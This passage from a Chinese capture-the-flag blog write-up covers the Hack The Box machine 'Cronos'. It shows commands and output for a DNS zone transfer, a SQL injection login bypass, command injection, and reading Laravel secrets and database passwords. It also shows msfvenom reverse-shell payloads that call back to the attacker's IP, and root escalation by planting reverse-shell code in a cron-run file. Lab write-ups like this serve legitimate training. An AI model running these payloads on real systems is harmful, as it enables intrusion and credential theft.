class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 60138</span><br><span class="line">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;13.10.10.10.in-addr.arpa.	IN	PTR</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">13.10.10.10.in-addr.arpa. 604800 IN	PTR	ns1.cronos.htb.</span><br><span class="line"></span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">10.10.10.in-addr.arpa.	604800	IN	NS	ns1.cronos.htb.</span><br><span class="line"></span><br><span class="line">;; ADDITIONAL SECTION:</span><br><span class="line">ns1.cronos.htb.		604800	IN	A	10.10.10.13</span><br><span class="line"></span><br><span class="line">;; Query time: 1149 msec</span><br><span class="line">;; SERVER: 10.10.10.13<span class="comment">#53(10.10.10.13)</span></span><br><span class="line">;; WHEN: 六 4月 18 23:46:32 UTC 2020</span><br><span class="line">;; MSG SIZE  rcvd: 111</span><br></pre></td></tr></table></figure>

<p>上面<code>dig</code>的命令参数，做一下说明</p>
<ul>
<li><code>@10.10.10.13</code> ：从指定 DNS 服务器<code>10.10.10.13</code>上查询</li>
<li><code>-x 10.10.10.13</code> ： 反向查询 IP 地址<code>10.10.10.13</code>对应的域名</li>
<li>还可以在后面追加<code>+short</code>获得精简的结果</li>
</ul>
<p>根据经验，带 ns1 的二级域名不太可能是靶机的服务，直接绑定<code>cronos.htb</code>到靶机 ip，访问之，图就不放了。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo "10.10.10.13 cronos.htb" &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<h2 id="80-端口：Laravel-gt-DNS-Zone-Transfer-gt-Admin"><a href="#80-端口：Laravel-gt-DNS-Zone-Transfer-gt-Admin" class="headerlink" title="80 端口：Laravel -&gt; DNS Zone Transfer -&gt; Admin"></a>80 端口：Laravel -&gt; DNS Zone Transfer -&gt; Admin</h2><p>从返回的 cookie 是<code>laravel_session</code>和页面内容可知，是个用了<code>Laravel</code>框架的 PHP 站<br>搜索可用漏洞，找到一个<code>unix/http/laravel_token_unserialize_exec</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; show info</span><br><span class="line">Basic options:</span><br><span class="line">  Name       Current Setting  Required  Description</span><br><span class="line">  <span class="comment">----       ---------------  --------  -----------</span></span><br><span class="line">  APP_KEY                     no        The base64 encoded APP_KEY string from the .env file</span><br><span class="line">Description:</span><br><span class="line">  This module exploits a vulnerability in the PHP Laravel Framework</span><br><span class="line">  for versions 5.5.40, 5.6.x &lt;= 5.6.29. Remote Command Execution is</span><br><span class="line">  possible via a correctly formatted HTTP X-XSRF-TOKEN header,</span><br><span class="line">  ... Authentication is not required,</span><br><span class="line">  however exploitation requires knowledge of the Laravel APP_KEY.</span><br><span class="line">  ...</span><br><span class="line">  In some cases the APP_KEY is leaked which allows for discovery and exploitation.</span><br></pre></td></tr></table></figure>

<p>果不其然，不填<strong>APP_KEY</strong>，打失败了，那么最关键的应该是这句话</p>
<blockquote>
<p>however exploitation requires knowledge of the <strong>Laravel APP_KEY.</strong></p>
</blockquote>
<p>猜测流程就是要<strong>读取到 Laravel 的配置文件.env</strong>，得到 APP_KEY，进而打 RCE 拿 shell 的过程<br><del>好吧，我尝试爆目录、爆文件泄漏</del>，浏览一个小时无果。。。<br>结果一看表哥们的过关 wp：<strong>域传送漏洞</strong>。（其实我看到 53 端口就想到这个漏洞了，只不过记不住命令（<del>懒得搜</del>），就没验证</p>
<h2 id="域传送漏洞"><a href="#域传送漏洞" class="headerlink" title="域传送漏洞"></a>域传送漏洞</h2><blockquote>
<p>在 windows 下使用 nslookup 指令<br>在 kali 下使用 dig 指令<br>在 kali 或者是 BT5 下使用 nmap,dnswalk,dnsenum 这三种工具</p>
</blockquote>
<h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dig @10.10.10.13 -t AXFR cronos.htb</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; @10.10.10.13 -t AXFR cronos.htb</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800</span><br><span class="line">cronos.htb.		604800	IN	NS	ns1.cronos.htb.</span><br><span class="line">cronos.htb.		604800	IN	A	10.10.10.13</span><br><span class="line">admin.cronos.htb.	604800	IN	A	10.10.10.13</span><br><span class="line">ns1.cronos.htb.		604800	IN	A	10.10.10.13</span><br><span class="line">www.cronos.htb.		604800	IN	A	10.10.10.13</span><br><span class="line">cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800</span><br><span class="line">;; Query time: 1366 msec</span><br><span class="line">;; SERVER: 10.10.10.13<span class="comment">#53(10.10.10.13)</span></span><br><span class="line">;; WHEN: 日 4月 19 00:47:59 UTC 2020</span><br><span class="line">;; XFR size: 7 records (messages 1, bytes 203)</span><br></pre></td></tr></table></figure>

<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>后面用 Nmap 的脚本扫这个漏洞，一开始没扫出来，猜测是 7.70 老版本原因，升级成 7.80 也没扫出来。。。anyway，参数配置应当如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=cronos.htb -p 53 -Pn 10.10.10.13</span></span><br></pre></td></tr></table></figure>

<h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p>网上流传的<code>nslookup</code>加<code>ls cronos.htb</code>的操作方式，在 kali 上并不适用。改用以下方式复现</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nslookup</span></span><br><span class="line">&gt; set q=AXFR</span><br><span class="line">&gt; server 10.10.10.13</span><br><span class="line">Default server: 10.10.10.13</span><br><span class="line">Address: 10.10.10.13<span class="comment">#53</span></span><br><span class="line"></span><br><span class="line">&gt; cronos.htb</span><br><span class="line"></span><br><span class="line">Server:		10.10.10.13</span><br><span class="line">Address:	10.10.10.13<span class="comment">#53</span></span><br><span class="line">cronos.htb</span><br><span class="line">	origin = cronos.htb</span><br><span class="line">	mail addr = admin.cronos.htb</span><br><span class="line">	serial = 3</span><br><span class="line">	refresh = 604800</span><br><span class="line">	retry = 86400</span><br><span class="line">	expire = 2419200</span><br><span class="line">	minimum = 604800</span><br><span class="line">cronos.htb	nameserver = ns1.cronos.htb.</span><br><span class="line">Name:	cronos.htb</span><br><span class="line">Address: 10.10.10.13</span><br><span class="line">Name:	admin.cronos.htb</span><br><span class="line">Address: 10.10.10.13</span><br><span class="line">Name:	ns1.cronos.htb</span><br><span class="line">Address: 10.10.10.13</span><br><span class="line">Name:	www.cronos.htb</span><br><span class="line">Address: 10.10.10.13</span><br><span class="line">cronos.htb</span><br><span class="line">	origin = cronos.htb</span><br><span class="line">	mail addr = admin.cronos.htb</span><br><span class="line">	serial = 3</span><br><span class="line">	refresh = 604800</span><br><span class="line">	retry = 86400</span><br><span class="line">	expire = 2419200</span><br><span class="line">	minimum = 604800</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>axfr</code> 是 q-type 类型的一种: axfr 类型是 Authoritative Transfer 的缩写，指请求传送某个区域的全部记录</p>
</blockquote>
<p>总之是得到了个<code>admin.cronos.htb</code>，绑定 host 后，是一个简陋的后台，本能地想测试是否存在注入，结果用密码<code>admin&#39;-- -</code>就进去了，属实给力。登录后的界面如下，是一个很舒服的 os 命令注入.<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587229480141-d0bcea86-979d-443e-9c71-90656ee1e535.png#align=left&display=inline&height=388&margin=%5Bobject%20Object%5D&name=%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20200419010558.png&originHeight=388&originWidth=959&size=35404&status=done&style=none&width=959" alt="深度截图_选择区域_20200419010558.png"><br>尝试写一句话，结果发现被弄成了<code>&lt;?php ([&#39;cmd&#39;]); ?&gt;</code>， 可能是有过滤。我们继续看，发现当前目录下有个<code>.welcome.php.swp</code>，并且<code>cat</code>似乎被禁用了？但是可以<code>cp</code>为不解析的<code>txt</code>文件，一样能读文件。把<code>admin</code>下的源码打包了，读了<code>Laravel</code>的.<code>env</code>文件，通过读<code>laravel</code>框架的<code>CHANGLOG.md</code>，确定了版本是<code>v5.4.16</code>，如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Release Notes</span></span><br><span class="line"><span class="comment">## v5.4.16 (2017-03-17)</span></span><br></pre></td></tr></table></figure>

<p>而 msf 中 exp 的版本要求为 5.5.40 或是 5.6.x &lt; 5.6.30</p>
<blockquote>
<p>PHP Laravel Framework 5.5.40 / 5.6.x &lt; 5.6.30 - token Unserialize Remote Com | exploits/linux/remote/47129.rb</p>
</blockquote>
<p>显然是不满足 rce 的版本要求，打一下，果然失败了，rabbit’s hole</p>
<p>后面又读一些密码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">APP_NAME=Laravel</span><br><span class="line">APP_ENV=local</span><br><span class="line">APP_KEY=base64:+fUFGL45d1YZYlSTc0Sm71wPzJejQN/K6s9bHHihdYE=</span><br><span class="line">APP_DEBUG=true</span><br><span class="line">APP_LOG_LEVEL=debug</span><br><span class="line">APP_URL=http://localhost</span><br><span class="line">...</span><br><span class="line">DB_CONNECTION=mysql</span><br><span class="line">DB_HOST=127.0.0.1</span><br><span class="line">DB_PORT=3306</span><br><span class="line">DB_DATABASE=homestead</span><br><span class="line">DB_USERNAME=homestead</span><br><span class="line">DB_PASSWORD=secret</span><br><span class="line">...</span><br><span class="line">REDIS_HOST=127.0.0.1</span><br><span class="line">REDIS_PASSWORD=null</span><br><span class="line">REDIS_PORT=6379</span><br></pre></td></tr></table></figure>

<h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p>用<code>msfvenom</code>做一个反弹<code>shell</code>的文件,</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload linux/x86/shell_reverse_tcp</span><br><span class="line">payload =&gt; linux/x86/shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> lport <span class="number">4443</span></span><br><span class="line">lport =&gt; <span class="number">4443</span></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started <span class="keyword">reverse</span> TCP <span class="keyword">handler</span> <span class="keyword">on</span> <span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span>:<span class="number">4443</span></span><br><span class="line">[*] Command shell <span class="keyword">session</span> <span class="number">1</span> opened (<span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span>:<span class="number">4443</span> -&gt; <span class="number">10.10</span><span class="number">.10</span><span class="number">.13</span>:<span class="number">57000</span>)</span><br></pre></td></tr></table></figure>

<p>或者像我一样发现 shell 不是<code>meterpreter</code>的 shell 之后，直接上冰蝎马了<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587232082212-c547d383-71f6-4c88-8b51-041189d5c500.png#align=left&display=inline&height=365&margin=%5Bobject%20Object%5D&name=behinder.png&originHeight=365&originWidth=1903&size=72632&status=done&style=none&width=1903" alt="behinder.png"><br>收集到的一些密码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">   define('DB_SERVER', 'localhost');</span><br><span class="line">   define('DB_USERNAME', 'admin');</span><br><span class="line">   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');</span><br><span class="line">   define('DB_DATABASE', 'admin');</span><br><span class="line">   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库中admin的密码hash</span></span><br><span class="line">	4f5fffa7b2340178a716e3832451e058</span><br><span class="line">解密结果如下</span><br><span class="line">	1327663704</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>交互式 shell</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash");'</span><br><span class="line">stty raw -echo</span><br></pre></td></tr></table></figure>

<p>基本信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uname -a</span></span><br><span class="line">Linux cronos 4.4.0-72-generic <span class="comment">#93-Ubuntu SMP</span></span><br><span class="line">Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat /etc/issue</span></span><br><span class="line"> Ubuntu 16.04.2 LTS</span><br></pre></td></tr></table></figure>

<p>suid 文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># find / -perm -u=s 2&gt; /dev/null</span></span><br><span class="line"></span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/ping6</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br></pre></td></tr></table></figure>

<p>pkexec 比较可疑，msf 里的 exp 打了一下，没成功。</p>
<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><p>准备一把梭了，用信息收集脚本<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues" target="_blank" rel="noopener">linPEAS.sh</a>，找到了个可疑的定时任务（其实定时任务用<code>cat /etc/crontab</code>来查看</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+] Cron jobs</span><br><span class="line">[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation<span class="comment">#scheduled-jobs</span></span><br><span class="line">-rw-r<span class="comment">--r-- 1 root root  797 Apr  9  2017 /etc/crontab</span></span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"></span><br><span class="line">* * * * *	root	php /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/admin) $ cat /etc/crontab</span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don't have to run the `crontab'</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line"><span class="comment"># m h dom mon dow user    command</span></span><br><span class="line"></span><br><span class="line">17 *    * * *    root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line">25 6    * * *    root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line">47 6    * * 7    root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line">52 6    1 * *    root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line">* * * * *    root    php /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>总之，注意到<code>root</code>用户有一个每分钟的定时任务：<code>php /var/www/laravel/artisa</code>，于是就过去在<code>artisa</code>文件的后面加上了反弹 shell 的 php 代码（之所以加在后面而不是在前面，是因为反弹 shell 的脚本貌似会阻塞线程，可能让 laravel 起不来，影响靶机的正常使用。）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成反弹shell的php代码</span></span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=10.10.16.122 LPORT=4444 &gt; 4444.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># msf收shell</span></span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">show</span> options</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> lhost tun0</span><br><span class="line">lhost =&gt; <span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; run</span><br><span class="line">[*] Started <span class="keyword">reverse</span> TCP <span class="keyword">handler</span> <span class="keyword">on</span> <span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span>:<span class="number">4444</span></span><br><span class="line">[*] Sending stage (<span class="number">38288</span> <span class="keyword">bytes</span>) <span class="keyword">to</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.13</span></span><br><span class="line">[*] Meterpreter <span class="keyword">session</span> <span class="number">1</span> opened (<span class="number">10.10</span><span class="number">.16</span><span class="number">.122</span>:<span class="number">4444</span> -&gt; <span class="number">10.10</span><span class="number">.10</span><span class="number">.13</span>:<span class="number">58804</span>)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"><span class="keyword">Server</span> username: root (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>其它提权思路</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">====================================( Interesting Files )=====================================</span><br><span class="line">[+] SUID - <span class="keyword">Check</span> easy privesc, exploits <span class="keyword">and</span> write perms</span><br><span class="line">[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation<span class="comment">#commands-with-sudo-and-suid-commands</span></span><br><span class="line">/<span class="keyword">bin</span>/ping</span><br><span class="line">/<span class="keyword">bin</span>/umount		<span class="comment">---&gt;	BSD/Linux(08-1996)</span></span><br><span class="line">/<span class="keyword">bin</span>/<span class="keyword">mount</span>		<span class="comment">---&gt;	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8</span></span><br><span class="line">/<span class="keyword">bin</span>/fusermount</span><br><span class="line">/<span class="keyword">bin</span>/su</span><br><span class="line">/<span class="keyword">bin</span>/ntfs<span class="number">-3</span>g		<span class="comment">--失败-&gt;	Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)</span></span><br><span class="line">/<span class="keyword">bin</span>/ping6</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-<span class="keyword">user</span>-nic</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/eject/dmcrypt-<span class="keyword">get</span>-device</span><br><span class="line">/usr/lib/policykit<span class="number">-1</span>/polkit-<span class="keyword">agent</span>-helper<span class="number">-1</span>	//失败</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus<span class="number">-1.0</span>/dbus-daemon-launch-helper			失败</span><br><span class="line">/usr/<span class="keyword">bin</span>/chsh</span><br><span class="line">/usr/<span class="keyword">bin</span>/newuidmap    失败</span><br><span class="line">/usr/<span class="keyword">bin</span>/sudo		<span class="comment">---&gt;	/sudo$</span></span><br><span class="line">/usr/<span class="keyword">bin</span>/chfn		<span class="comment">---&gt;	SuSE_9.3/10</span></span><br><span class="line">/usr/<span class="keyword">bin</span>/newgrp		<span class="comment">---&gt;	HP-UX_10.20</span></span><br><span class="line">/usr/<span class="keyword">bin</span>/<span class="keyword">at</span>		<span class="comment">---&gt;	RTru64_UNIX_4.0g(CVE-2002-1614)</span></span><br><span class="line">/usr/<span class="keyword">bin</span>/pkexec		<span class="comment">---&gt;	Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)</span></span><br><span class="line">/usr/<span class="keyword">bin</span>/newgidmap		 失败</span><br><span class="line">/usr/<span class="keyword">bin</span>/gpasswd				 失败</span><br><span class="line">/usr/<span class="keyword">bin</span>/passwd		<span class="comment">---&gt;	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)</span></span><br></pre></td></tr></table></figure>

<p>或者用 msf 自带的信息收集模块<code>linux/gather/enum_system</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(linux/gather/enum_system) &gt; run</span><br><span class="line"></span><br><span class="line">[+] Info:</span><br><span class="line">[+] 	Ubuntu 16.04.2 LTS</span><br><span class="line">[+] 	Linux cronos 4.4.0-72-generic <span class="comment">#93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">[+] 	Module running as "www-data" user</span><br><span class="line">[*] Linux version stored in /ro...........................</span><br><span class="line">[*] User accounts stored in /ro...........................</span><br><span class="line">[*] Installed Packages stored i...........................</span><br><span class="line">[*] Running Services stored in ...........................</span><br><span class="line">[*] Cron jobs stored in /root/............................</span><br><span class="line">[*] Disk info stored in /root/............................</span><br><span class="line">[*] Logfiles stored in /root/.m...........................</span><br><span class="line">[*] Setuid/setgid files stored ...........................</span><br><span class="line">[*] CPU Vulnerabilities stored ...........................</span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure>

<h1 id="反思与总结"><a href="#反思与总结" class="headerlink" title="反思与总结"></a>反思与总结</h1><ul>
<li>注意到 laravel 框架的调试模式是打开的：<code>APP_DEBUG=true</code>，可否利用？</li>
</ul>
<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul>
<li><a href="https://www.linuxquestions.org/questions/linux-server-73/nslookup-ls-option-not-implemented-605679/" target="_blank" rel="noopener">nslookup-ls-option-not-implemented</a></li>
